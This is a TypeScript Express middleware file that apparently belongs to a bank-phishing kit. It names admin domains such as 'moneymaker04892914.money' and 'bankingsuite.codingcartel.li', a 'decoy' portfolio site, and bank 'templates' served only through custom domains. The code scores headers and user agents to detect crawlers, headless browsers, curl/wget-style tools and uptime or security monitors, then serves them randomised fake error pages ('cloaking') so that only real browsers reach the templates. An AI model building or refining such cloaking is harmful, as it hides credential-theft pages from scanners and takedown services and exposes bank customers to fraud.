/**
 * Anti-Bot Middleware
 * Detects and blocks known crawlers, bots, and automated tools
 */

import { Request, Response, NextFunction } from 'express';
import path from 'path';
import fs from 'fs';
import { config } from '../config';
import { loadCrawlerPatterns, matchesCrawlerPattern } from '../utils/crawlerPatterns';
import { getClientIP } from '../utils/ipUtils';
import { getDb } from '../database';
import { getRandomErrorPagePath, generateFallbackErrorPage } from '../utils/errorPageSelector';
import notificationService from '../services/notificationService';

// Load crawler patterns once on startup
let crawlerPatterns = loadCrawlerPatterns();

// Monitoring service patterns (highest priority)
const MONITORING_PATTERNS = [
  /uptimerobot/i,
  /pingdom/i,
  /freshping/i,
  /betteruptime/i,
  /cloudflare.*health/i,
  /monitor/i,
  /uptime.*bot/i,
  /site.*check/i,
  /health.*check/i,
  /status.*check/i,
  /datadog/i,
  /newrelic/i,
  /statuspage/i
];

// Automation tool patterns
const AUTOMATION_PATTERNS = [
  /curl/i,
  /wget/i,
  /python/i,
  /node.*fetch/i,
  /axios/i,
  /postman/i,
  /insomnia/i,
  /test/i,
  /automation/i,
  /script/i,
  /bot/i,
  /crawler/i,
  /spider/i
];

export interface BotDetectionResult {
  isBot: boolean;
  score: number;
  reasons: string;
  threshold: number;
  method: 'user-agent' | 'headers' | 'hybrid';
}

/**
 * Enhanced bot detection through header analysis
 * Uses a scoring system to identify bots based on header patterns
 */
export function detectBotHeaders(headers: any, userAgent: string = '', threshold: number = 4): BotDetectionResult {
  let score = 0;
  const reasons: string[] = [];
  
  // Check for monitoring services (highest priority)
  if (userAgent) {
    for (const pattern of MONITORING_PATTERNS) {
      if (pattern.test(userAgent)) {
        score += 10;
        reasons.push('Monitoring service detected');
        break;
      }
    }
    
    for (const pattern of AUTOMATION_PATTERNS) {
      if (pattern.test(userAgent)) {
        score += 8;
        reasons.push('Automation tool detected');
        break;
      }
    }
  }
  
  // Missing common browser headers
  if (!headers.cookie) {
    score += 3; // Increased penalty
    reasons.push('No cookies');
  }
  
  if (!headers['accept-language']) {
    score += 3; // Increased penalty
    reasons.push('No accept-language');
  }
  
  if (!headers['accept']) {
    score += 3; // Increased penalty 
    reasons.push('No accept header');
  }
  
  if (!headers['referer'] && !headers['referrer']) {
    score += 2; // Increased penalty
    reasons.push('No referer');
  }
  
  // Additional automation detection
  if (!headers['sec-fetch-dest'] && !headers['sec-fetch-mode']) {
    score += 2;
    reasons.push('Missing Sec-Fetch headers');
  }
  
  // Check for automation-specific patterns in headers
  const acceptEncoding = headers['accept-encoding'];
  if (acceptEncoding && !acceptEncoding.includes('gzip')) {
    score += 1;
    reasons.push('Unusual accept-encoding');
  }
  
  // User-agent analysis
  if (headers['user-agent']) {
    const ua = headers['user-agent'].toLowerCase();
    
    // Headless browser detection
    if (ua.includes('headless')) {
      score += 5;
      reasons.push('Headless browser');
    }
    
    if (ua.includes('phantomjs') || ua.includes('phantom')) {
      score += 5;
      reasons.push('PhantomJS detected');
    }
    
    if (ua.includes('puppeteer')) {
      score += 5;
      reasons.push('Puppeteer detected');
    }
    
    if (ua.includes('selenium') || ua.includes('webdriver')) {
      score += 5;
      reasons.push('Selenium/WebDriver detected');
    }
    
    // Suspicious patterns
    if (ua.length < 20) {
      score += 3;
      reasons.push('Suspiciously short UA');
    }
    
    if (ua === 'mozilla/5.0') {
      score += 4;
      reasons.push('Generic Mozilla UA');
    }
    
    // Inconsistent signatures
    if (ua.includes('chrome') && !ua.includes('webkit')) {
      score += 3;
      reasons.push('Inconsistent Chrome signature');
    }
    
    if (ua.includes('safari') && !ua.includes('webkit')) {
      score += 3;
      reasons.push('Inconsistent Safari signature');
    }
  } else {
    score += 5;
    reasons.push('No user agent');
  }
  
  // Automation-specific headers
  for (const key in headers) {
    const lowerKey = key.toLowerCase();
    
    if (lowerKey.includes('automation') || 
        lowerKey.includes('selenium') || 
        lowerKey.includes('driver') || 
        lowerKey.includes('puppeteer') ||
        lowerKey.includes('headless')) {
      score += 5;
      reasons.push(`Automation header: ${key}`);
    }
    
    if (lowerKey.includes('uptime') || 
        lowerKey.includes('monitor') || 
        lowerKey.includes('ping') ||
        lowerKey.includes('health')) {
      score += 8;
      reasons.push(`Monitoring header: ${key}`);
    }
  }
  
  // Accept header analysis
  if (headers['accept']) {
    const accept = headers['accept'].toLowerCase();
    
    if (!accept.includes('text/html')) {
      score += 3;
      reasons.push('Non-browser accept header');
    }
    
    if (accept === 'application/json') {
      score += 2;
      reasons.push('JSON-only accept');
    }
    
    if (accept === '*/*') {
      score += 2;
      reasons.push('Generic accept header');
    }
  }
  
  // Connection patterns
  if (headers['connection']?.toLowerCase() === 'close') {
    score += 1;
    reasons.push('Connection: close');
  }
  
  return {
    isBot: score >= threshold,
    score,
    reasons: reasons.join(', '),
    threshold,
    method: 'headers'
  };
}

/**
 * Check if path should bypass anti-bot checks
 */
function shouldBypassAntiBot(reqPath: string): boolean {
  // Static assets (always bypass)
  if (reqPath.match(/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot)(\?.*)?$/)) {
    return true;
  }
  
  if (reqPath.includes('/assets/') || reqPath.includes('/fonts/') || reqPath.includes('/images/')) {
    return true;
  }
  
  // Portfolio decoy site
  if (reqPath === '/portfolio' || reqPath.startsWith('/portfolio/')) {
    return true;
  }
  
  // Admin routes (always allow admin access)
  if (reqPath.startsWith('/admin') || reqPath.startsWith('/login')) {
    return true;
  }
  
  // ALL API endpoints should bypass anti-bot (admin functionality)
  if (reqPath.startsWith('/api/')) {
    return true;
  }
  
  // Template routes are NOT bypassed - they go through anti-bot with lenient threshold
  return false;
}

/**
 * Get anti-bot configuration from database
 */
async function getAntiBotConfig() {
  try {
    const db = getDb();
    const configs = db.prepare('SELECT config_key, config_value FROM antibot_config').all() as Array<{config_key: string, config_value: string}>;
    
    console.log(`🔧 [ANTI-BOT] Loaded ${configs.length} config entries from database`);
    
    const configObj: any = {};
    configs.forEach(row => {
      let value: any = row.config_value;
      
      // Parse boolean values
      if (value === 'true') value = true;
      else if (value === 'false') value = false;
      // Parse numeric values
      else if (!isNaN(Number(value))) value = Number(value);
      // Parse array values
      else if (value.includes(',')) value = value.split(',').map((s: string) => s.trim());
      
      configObj[row.config_key] = value;
      
      // Log important config values for debugging
      if (row.config_key === 'enable_antibot' || row.config_key === 'header_threshold') {
        console.log(`🔧 [ANTI-BOT] Config: ${row.config_key} = ${value} (type: ${typeof value})`);
      }
    });
    
    return configObj;
  } catch (error) {
    console.error('❌ [ANTI-BOT] Error loading anti-bot config from database:', error);
    console.log('🔧 [ANTI-BOT] Falling back to default configuration (enabled=true)');
    return { enable_antibot: true, header_threshold: 4 }; // Safe fallback
  }
}

/**
 * Anti-bot middleware
 */
export async function antiBot(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    // Get configuration (database overrides environment)
    const dbConfig = await getAntiBotConfig();
    const enabled = dbConfig.enable_antibot ?? config.antiBot?.enabled ?? true;
    
    console.log(`🔧 [ANTI-BOT] Configuration: enabled=${enabled}, dbConfig:`, dbConfig);
    
    // Skip if disabled
    if (!enabled) {
      console.log(`⚠️ [ANTI-BOT] DISABLED - Allowing all traffic through for ${req.get('host')}${req.path}`);
      return next();
    }
    
  // Bypass certain paths
  if (shouldBypassAntiBot(req.path)) {
    return next();
  }
  
  // Get database for domain checking
  const db = getDb();
  
  // Get hostname for domain-based rules
  const hostname = (req.get('host') || '').split(':')[0];
  
  console.log(`🔍 [ANTI-BOT] Checking hostname: ${hostname}, path: ${req.path}`);
  
  // Check if this is an admin domain (bypass anti-bot completely)
  const adminDomains = ['moneymaker04892914.money', 'bankingsuite.codingcartel.li'];
  const isAdminDomain = adminDomains.some(domain => hostname?.includes(domain));
  
  if (isAdminDomain) {
    console.log(`✅ [ANTI-BOT] Admin domain detected, bypassing anti-bot`);
    return next();
  }
  
  // Check if accessed via custom domain (domain exists in domains table)
  let isCustomDomain = false;
  let isTemplateRoute = false;
  
  // Always check if path matches any template folder from database
  try {
    const templates = db.prepare('SELECT folder_name FROM templates').all() as Array<{folder_name: string}>;
    isTemplateRoute = templates.some(t => req.path.startsWith(`/${t.folder_name}`));
    console.log(`🔍 [ANTI-BOT] Template route check: ${req.path} -> isTemplateRoute=${isTemplateRoute}`);
  } catch (error) {
    console.error(`❌ [ANTI-BOT] Error checking template routes:`, error);
    isTemplateRoute = false;
  }
  
  if (hostname && !hostname.includes('localhost') && !hostname.includes('127.0.0.1')) {
    try {
      // Check if this hostname is a custom bank domain in database
      const domainCheck = db.prepare('SELECT id FROM domains WHERE domain_name = ? AND is_active = 1').get(hostname);
      isCustomDomain = !!domainCheck;
      
      console.log(`🔍 [ANTI-BOT] Domain check for ${hostname}: found=${!!domainCheck}, isCustomDomain=${isCustomDomain}`);
    } catch (error) {
      console.error(`❌ [ANTI-BOT] Error checking domain:`, error);
      isCustomDomain = false;
    }
  }
    
    // Prevent API endpoint bypass via file extensions
    if (req.path.startsWith('/api/') && 
        req.path.match(/\.(js|css|png|jpg|pdf|zip|exe|php|asp|jsp)(\?.*)?$/i)) {
      console.log(`🚫 [ANTI-BOT] Blocked API endpoint with file extension: ${req.path}`);
      return res.status(404).send('Not Found');
    }
    
    const userAgent = req.headers['user-agent'] || '';
    const clientIP = getClientIP(req, config.server.trustProxy);
    
    // Check IP blocklist (from database - last 7 days) - BUT BE MORE LENIENT
    let blockedIP = null;
    try {
      blockedIP = db.prepare(`
      SELECT * FROM blocked_visitors 
      WHERE ip_address = ? 
      AND blocked_at > datetime('now', '-7 days')
        ORDER BY blocked_at DESC
      LIMIT 1
    `).get(clientIP);
    
    if (blockedIP) {
      console.log(`⚠️ [ANTI-BOT] Previously blocked IP detected: ${clientIP}`);
        console.log(`   Last blocked: ${blockedIP.blocked_at}, Score: ${blockedIP.detection_score}, Method: ${blockedIP.detection_method}`);
        
        // ONLY block immediately if it was a high-confidence automation detection (score >= 10)
        // OR if blocked multiple times in the last 24 hours
        try {
          const recentBlocks = db.prepare(`
            SELECT COUNT(*) as count FROM blocked_visitors 
            WHERE ip_address = ? 
            AND blocked_at > datetime('now', '-1 day')
          `).get(clientIP) as { count: number };
          
          if (blockedIP.detection_score >= 10 || recentBlocks.count >= 3) {
            console.log(`🚫 [ANTI-BOT] High-risk IP (score: ${blockedIP.detection_score}, recent blocks: ${recentBlocks.count}) - BLOCKING`);
            const { generateFallbackErrorPage } = require('../utils/errorPageSelector');
            return res.status(403).send(generateFallbackErrorPage());
          } else {
            console.log(`⚡ [ANTI-BOT] Previously blocked but allowing second chance (score: ${blockedIP.detection_score}, recent blocks: ${recentBlocks.count})`);
            // Continue with normal detection - give it a second chance but be more strict
          }
        } catch (recentBlockError) {
          console.error(`❌ [ANTI-BOT] Error checking recent blocks for IP ${clientIP}:`, recentBlockError);
          console.log(`⚡ [ANTI-BOT] Assuming single block, allowing second chance`);
        }
      }
    } catch (error) {
      console.error(`❌ [ANTI-BOT] Error checking blocked IP database for ${clientIP}:`, error);
      blockedIP = null; // Fail gracefully
    }
    
    // User-agent based detection
    const isKnownBot = matchesCrawlerPattern(userAgent, crawlerPatterns);
    
    // Header-based detection with smart rules
    const baseThreshold = dbConfig.header_threshold ?? config.antiBot?.headerThreshold ?? 4;
    console.log(`🔧 [ANTI-BOT] Base threshold from config: ${baseThreshold}`);
    
    let headerThreshold: number;
    
    // If previously blocked with low score, be more strict this time
    const wasRecentlyBlocked = blockedIP && blockedIP.detection_score < 10;
    const strictnessBonus = wasRecentlyBlocked ? 2 : 0; // Be 2 points stricter for previously blocked IPs
    
    if (isCustomDomain && isTemplateRoute) {
      // Custom domain accessing template route - this is the normal flow after domain rewriting
      // Apply VERY STRICT threshold - block everything except perfect legitimate browsers  
      headerThreshold = Math.max(1, 2 - strictnessBonus); // VERY STRICT - only perfect browsers pass
      console.log(`🔍 [ANTI-BOT] Custom domain template access - applying VERY STRICT threshold (${headerThreshold})`);
    } else if (isCustomDomain && !isTemplateRoute) {
      // Custom domain accessing root path (/) - this is legitimate users accessing their assigned template
      // Be more lenient since domain rewriting will handle template injection
      if (req.path === '/') {
        // First, check for obvious automation with stricter threshold
        const headerAnalysisQuick = detectBotHeaders(req.headers, userAgent, 1);
        console.log(`🔍 [ANTI-BOT] Pre-check for custom domain: score=${headerAnalysisQuick.score}, reasons=${headerAnalysisQuick.reasons}`);
        
        // Make automation detection less aggressive - only block really obvious bots
        if (headerAnalysisQuick.score >= 12) { // Raised from 8 to 12 - only block very obvious automation
          console.log(`🚫 [ANTI-BOT] Obvious automation detected (score: ${headerAnalysisQuick.score}) on custom domain - blocking`);
          console.log(`🚫 [ANTI-BOT] Reasons: ${headerAnalysisQuick.reasons}`);
          return res.status(403).send(generateFallbackErrorPage());
        }
        
        // More lenient for clean browsers - allow typical browser missing some headers
        headerThreshold = Math.max(baseThreshold + 4, 8 - strictnessBonus); // More lenient for template injection  
        console.log(`✅ [ANTI-BOT] Custom domain root access - applying LENIENT threshold (${headerThreshold}) for template injection`);
      } else {
        // Custom domain but other non-template routes (assets, etc.)
        headerThreshold = Math.max(baseThreshold, 4 - strictnessBonus); // Normal threshold
        console.log(`🔍 [ANTI-BOT] Custom domain non-template access - applying normal threshold (${headerThreshold})`);
      }
    } else if (isTemplateRoute) {
      // ANY direct template path access (regardless of domain) - BLOCK COMPLETELY
      console.log(`🚫 [ANTI-BOT] Direct template path access blocked - templates only accessible via domain root`);
      return res.status(403).send(generateFallbackErrorPage());
    } else {
      // Everything else - normal threshold
      headerThreshold = Math.max(baseThreshold, 4 - strictnessBonus);
      console.log(`🔍 [ANTI-BOT] Standard access - applying normal threshold (${headerThreshold})`);
    }
    
    if (wasRecentlyBlocked) {
      console.log(`⚡ [ANTI-BOT] Previously blocked IP - applied +${strictnessBonus} strictness bonus`);
    }
    
    const headerAnalysis = detectBotHeaders(req.headers, userAgent, headerThreshold);
    
    console.log(`🔍 [ANTI-BOT] Final check: isCustomDomain=${isCustomDomain}, isTemplateRoute=${isTemplateRoute}, threshold=${headerThreshold}, score=${headerAnalysis.score}`);
    console.log(`🔍 [ANTI-BOT] Client IP: ${clientIP}, User-Agent: ${userAgent.substring(0, 100)}`);
    
    // Combine detection methods
    if (isKnownBot || headerAnalysis.isBot) {
      const detectionMethod = isKnownBot ? 'user-agent' : 'headers';
      
      console.log(`🚫 [ANTI-BOT] Bot detected via ${detectionMethod}`);
      console.log(`   IP: ${clientIP}`);
      console.log(`   UA: ${userAgent}`);
      console.log(`   Score: ${headerAnalysis.score}/${headerAnalysis.threshold}`);
      console.log(`   Reasons: ${headerAnalysis.reasons}`);
      
      // Log to database
      try {
        db.prepare(`
          INSERT INTO blocked_visitors (
            ip_address, user_agent, detection_method, detection_score,
            detection_reasons, requested_path, headers_json
          ) VALUES (?, ?, ?, ?, ?, ?, ?)
        `).run(
          clientIP,
          userAgent,
          detectionMethod,
          headerAnalysis.score,
          headerAnalysis.reasons,
          req.path,
          JSON.stringify(req.headers)
        );

        // Create notification for bot detection
        await notificationService.notifyBotDetected(
          clientIP,
          userAgent,
          detectionMethod,
          headerAnalysis.score
        );
      } catch (dbError) {
        console.error('Error logging blocked visitor:', dbError);
      }
      
      // Redirect to cloaking page if enabled
      const cloakingEnabled = dbConfig.enable_cloaking ?? config.antiBot?.cloaking ?? true;
      
      if (cloakingEnabled) {
        const errorPagePath = getRandomErrorPagePath();
        if (errorPagePath && fs.existsSync(errorPagePath)) {
          return res.sendFile(errorPagePath);
        } else {
          // Fallback to generated HTML if files don't exist
          return res.status(403).send(generateFallbackErrorPage());
        }
      }
      
      return res.status(403).send('Access Denied');
    }
    
    // Not a bot - continue
    console.log(`✅ [ANTI-BOT] ALLOWED - IP: ${clientIP}, Host: ${hostname}, Path: ${req.path}, Score: ${headerAnalysis.score}/${headerThreshold}`);
    console.log(`✅ [ANTI-BOT] Detection summary: isBot=${headerAnalysis.isBot}, reasons="${headerAnalysis.reasons}"`);
    next();
  } catch (error) {
    console.error('❌ [ANTI-BOT] Critical error in anti-bot middleware:', error);
    console.log('🔧 [ANTI-BOT] FAILING OPEN - Allowing request through due to error');
    // On error, allow through (fail open for availability)
    next();
  }
}

/**
 * Refresh crawler patterns (for runtime updates)
 */
export function refreshCrawlerPatterns(): void {
  try {
    crawlerPatterns = loadCrawlerPatterns();
    console.log('✅ Crawler patterns refreshed');
  } catch (error) {
    console.error('Error refreshing crawler patterns:', error);
  }
}
